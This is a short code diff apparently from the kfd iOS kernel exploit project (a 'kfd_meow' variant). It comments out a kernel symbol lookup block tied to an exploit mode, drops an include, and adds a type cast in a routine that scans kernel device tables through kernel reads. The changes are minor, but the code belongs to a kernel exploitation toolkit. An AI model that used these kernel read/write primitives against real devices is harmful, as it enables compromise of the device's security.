@@ -3,7 +3,6 @@
  */
 
 #include "perf.h"
-#include "kfd_meow-Swift.h"
 
 #include <mach/mach.h>
 #include <mach-o/dyld.h>
@@ -41,7 +40,7 @@ void perf_init(struct kfd* kfd)
     memset((void*)(shared_page_address), 0, shared_page_size);
     kfd->perf.shared_page.uaddr = shared_page_address;
     kfd->perf.shared_page.size = shared_page_size;
-    
+    /*
     objcbridge *obj = [[objcbridge alloc] init];
     if(isarm64e() && kfd->info.env.vid >= 10 && kfd->info.env.exploit_type == MEOW_EXPLOIT_SMITH) {
         kaddr_vm_pages = [obj find_vm_pages];
@@ -49,6 +48,7 @@ void perf_init(struct kfd* kfd)
         kaddr_vm_page_array_ending = [obj find_vm_page_array_ending];
         kaddr_vm_first_phys_ppnum = [obj find_vm_first_phys_ppnum];
     }
+     */
 }
 
 void perf_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
@@ -240,7 +240,7 @@ void perf_run(struct kfd* kfd)
         kread_kfd((uint64_t)(kfd), kaddr, &cdevsw, sizeof(cdevsw));
         uint64_t d_open = unsign_kaddr(cdevsw[0]);
         if (d_open == perfmon_dev_open_kaddr) {
-            dev_new_major = (dmaj << 24);
+            dev_new_major = (uint32_t)(dmaj << 24);
             break;
         }
     }
